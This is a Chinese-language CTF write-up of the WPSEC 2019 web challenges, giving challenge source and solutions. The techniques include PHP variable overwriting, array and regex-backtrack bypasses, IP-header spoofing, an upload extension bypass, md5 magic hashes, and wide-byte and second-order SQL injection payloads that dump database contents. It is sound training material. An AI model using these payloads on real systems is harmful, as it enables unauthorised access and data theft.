---
title: "WPSEC 2019 Web: Source Analysis and Challenge Notes"
title_zh: "WPSEC 2019 Web：源码分析与解题复盘"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: WPSEC 2019 Web
date: 2019-03-04 18:45:00
slug: WPSEC-2019-Web
permalink: writing/WPSEC-2019-Web/
topic: CTF
summary: "Working through variable handling, comparisons, regular expressions and uploads, including an unfinished investigation."
summary_zh: "按题目展示变量覆盖、数组类型、弱比较、正则回溯、上传和 SQL 注入的分析过程，穿插源码与抓包解释，并如实记录最后一道题尚未完成的探索。"
format_label: CTF write-up
featured_rank: 0
missing_images: 12
withheld_images: 0
recovered_images: 0
tags: CTF
---

## 1

![历史配图暂缺](redacted-image:missing)

## 2

![历史配图暂缺](redacted-image:missing)

#### 同时GET，POST

## 3

#### 【代码审计】之变量覆盖一

```
flag In the variable !


flag In the variable ! 

<?php
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}


?>
```

附上源码
PHP自动化的全局变量：**$GLOBALS** —— 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

正则表达式"/^\w+$/"，匹配字符串，\w表示字符+数字+下划线{ a-z,A-Z,_,0-9 }。如果不匹配会输出 ‘’args error!‘’\

两个`/``/` 表明正则表达式的开始与结束，`^`开始字符，`$`结束字符，`+`代表可以有一个或多个`\w`。

PHP中变量可以当作另一个变量的变量名：$$args，结合第一句flag In the variable !

所以构造payload：URL?args=GLOBALS

即可爆出所有args，其中包含flag。
![历史配图暂缺](redacted-image:missing)

## 4

#### 【代码审计】之数组绕过

```php
<?php
error_reporting(0);
include "flag3.php";
highlight_file(__file__);
function areyouok($greeting){
    return preg_match('/Wpsec.*Good/is',$greeting);
}

$greeting=@$_POST['greeting'];
if($greeting){
    if(!areyouok($greeting)){
        if(strpos($greeting,'Wpsec Good')!==false){
            echo 'Wpsec Good. '.$flag;
        }else{
            echo 'Do you know php?';
        }
    }else{
        echo 'Do you really know PHP?';
    }
}
?>
```

附上源码
PHP strpos() 函数:查找 "php" 在字符串中第一次出现的位置：
**eg:**

```php
<?php
echo strpos("You love php, I love php too!","php");
?>
```

要求post一个 greeting参数，经过areyouok函数正则过滤后如果返回false，
就进入下一个if，如果 greeting参数包含 Wpsec Good则打印flag。
可以利用strpos函数的一个漏洞，传入一个数组，会返回 NULL， NULL不强等于false，即可绕过。
**注：PHP函数中大部分无法处理数组**
构造payload:

```
greeting= &greeting[]=Wpsec Good
```

## 5

![历史配图暂缺](redacted-image:missing)

#### F12——网络——消息头

## 6

#### 【代码审计】之变量覆盖二

```php
<?php
   error_reporting(0);
   include "flag.php";
   highlight_file(__file__);
   $_403 = "Access Denied";

   $_200 = "Welcome Admin";

   if ($_SERVER["REQUEST_METHOD"] != "POST")
   {

         die("WPSEC-CTF is here :p...");
   }
   if ( !isset($_POST["flag"]) )
   {
         die($_403);
   }
   foreach ($_GET as $key => $value)
   {
         $$key = $$value;
   }
   foreach ($_POST as $key => $value)
   {
         $$key = $value;
   }
   if ( $_POST["flag"] !== $flag )
   {
         die($_403);
   }
   echo "This is your flag : ". $flag . "\n";
   die($_200);
?>
WPSEC-CTF is here :p...
```

附上源码
题目分析：

源码包含了flag.php文件，并且需要满足3个if 里的条件才能获取flag，题目中使用了两个foreach并且也使用了  ```$$.```两个foreach中对```$$key```的处理是不一样的，满足条件后会将```$flag```里面的值打印出来，所以```$flag```是在flag.php文件文件中的。

但是由于```$flag```的值会被中间部分代码给覆盖掉，所以需要先将```$flag```的值赋给```$_200```或```$_403```变量，然后利用```die($_200)```或 die```($_403)```将flag打印出来。

两个foreach函数遍历数组函数，这里就是把我们用get方法传输的数据当做数组进行遍历，并将遍历的参数赋值给key，将参数值复制给value。
还有一个if判断语句，判断用post方法传输的数据是不是和```$flag```的值相同，如果相同，输出flag。
最后输出```$200```的内容。

解题方法：

由于第7，11-14行间的代码会将```$flag```的值给覆盖掉，所以只能利用第一个foreach先将```$flag```的值赋给```$_200```，然后利用```die($_200)```将原本的flag值打印出来。

最终PAYLOAD：

```
GET DATA：?_200=flag 

POST DATA：flag=1
```

## 7

#### IP伪造+密码学

IP伪造的方法：

```
X-Forwarded-For
Client-IP
x-remote-IP
x-originating-IP
x-remote-addr
```

解题：
用burp进行抓包，前提是先输入账户密码，一般我们使用账户admin,密码随意，抓包后进行ip伪造，![历史配图暂缺](redacted-image:missing)

#### 注意这里的IP为题目上提到的，并不是本地的

之后，send to repeater,运行后发现，![历史配图暂缺](redacted-image:missing)
rot13这里用到密码学，解码后发现，jcfrp=wpsec，很显然，这就是密码，不难想到，只有账户和密码同时正确，并且ip伪造成功，才能得到我们的flag，故输入admin,wpsec，后抓包，ip伪造，得到**FLAG**
![历史配图暂缺](redacted-image:missing)

## 8

文件上传，这里需要提到文件内容拼接的基础方法（原个人站内链接已省略）
上传时借助抓包工具，![历史配图暂缺](redacted-image:missing)
这里我们需要修改**“2.jpg”为"2.php"**方可绕过，拿到flag,![历史配图暂缺](redacted-image:missing)

## 9

#### sql注入之宽字节注入

这里我们需要用到%df',类似于sql-lab-less32吧，
尝试注入```?id=0%df' union select 1,1,1--+```

#### 注意这里过滤了#注释，故我们可以使用其他的注释

![历史配图暂缺](redacted-image:missing)

接下来就直接放payload:
爆库:
```?id=0%df' union select 1,1,database()--+```
爆表:
```?id=0%df' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database()--+```
爆值:
```?id=0%df' union select 1,1,group_concat(flag) from test.flag--+```
**注意：这里由于限制了 ' 我们无法用常用的语句，如 "table_name='flag'，这样无法绕过**
最终拿到**FLAG**

## 10

```php
<?php
  error_reporting(0);
  include "flag2.php";
  highlight_file(__file__);
  $flag = 'xxx';

  extract($_GET);

  if (isset($gift)) 
  {
    $content = trim(file_get_contents($flag));

    if ($gift == $content) 
    {
     
       if(isset($_POST['id']))
       {$a = 'huahuishishabi';
        @parse_str($_POST['id']);
        if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) 
        {
                 echo $theflag;
        } 
        else 
        {


          exit('oh...no..');



        }

      }
        else{
          echo 'oh..no.no..'; 
        }
      
    }

  } 
       else 
      {
           echo 'Oh..';
      }

  


?>
Oh..
```

附上源码
PHP trim() 函数：移除字符串两侧的空白字符或其他预定义字符。
PHP extract() 函数：从数组中将变量导入到当前的符号表。
PHP parse_str() 函数:把查询字符串解析到变量中。
题目分析：
第一个if GET传flag 和 gift 的值，如果弱类型相等即可执行结下了的语句
第二个if POST传id,如果id的值等于a[0]，a[0]的值等于md5加密后与QNKCDZO加密后一样，即都为0e开头的即可
整理一下思路：首先要求使用GET提交flag和gift参数，其次用POST提交id参数，然后```parse_str($id)```对id参数的数据进行处理，再使用判断```$a[0] != ‘QNKCDZO’ && md5($a[0]) == md5(‘QNKCDZO’)```的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足```$a[0] != ‘QNKCDZO’ && md5($a[0]) == md5(‘QNKCDZO’)```所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a

##### 这里用到[PHP处理0e开头md5哈希字符串缺陷/bug](http://www.cnblogs.com/Primzahl/p/6018158.html)

解题过程：
![历史配图暂缺](redacted-image:missing)

## 11

```
<?php
error_reporting(0);
include "flag4.php";
highlight_file(__file__);
function areyouok($greeting){
    return preg_match('/Wpsec.*Good/is',$greeting);
}

$greeting=@$_POST['greeting'];
if(!is_array($greeting)){
    if(!areyouok($greeting)){
        if(strpos($greeting,'Wpsec Good')!==false){
            echo 'Wpsec Good. '.$flag;
        }else{
            echo 'Do you know php?';
        }
    }else{
        echo 'Do you really know PHP?';
    }
}
?>
Do you know php?
```

附上源码
题目分析：
这道题与前面的一道题类似
但是加上了is_array的判断，不允许使用数组来绕过。
所以那道题的思路不能再用了。 这里需要用到正则回溯，可以参考大牛的文章：[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限 pcre.backtrack_limit，默认为100万。当正则回溯超过这个上限时，就会返回false。
因此我们只要post100万个字符，让它回溯大于100万次，函数就会返回false，从而绕过if判断。
解题思路：
这里我直接上传了脚本

```
import requests
data = {"greeting":"Wpsec Good" + "aaaaa" * 1000000}
res = requests.post('http://192.0.2.30:5002/phpgood2.php', data=data)
print (res.content)
```

结果
![历史配图暂缺](redacted-image:missing)

当然还有另一种解题思路，但是比较麻烦
直接POST ```greeting=Wpsec Good (后面省略一百万个字符）```

## 12

这道300分的题一看就不简单，题目名字sqlsql，故推断需要进行两次注入
第一次注入，其实和sql-lab-less24题很像。
解题思路：
我们先利用注册，进行注册```username:admin'#,password:123```
接着根据经验，这时候修改密码，修改后的密码便是

```
username:admin的密码
```

登陆后，发现后台提示table:flag,tolumn:flag，不难想到，表名，列名，但是用这个信息注入还不行，
因为delete过滤了太多
这道题的过滤点 union where or 对我们构成必要的sql语句造成了不便，这时候我们可以用/**/
例如：

```
un/**/ion 
whe/**/re 
o/**/r
```

但是由于只是储备有限，最终未能拿到flag，不过据说需要用脚本跑。
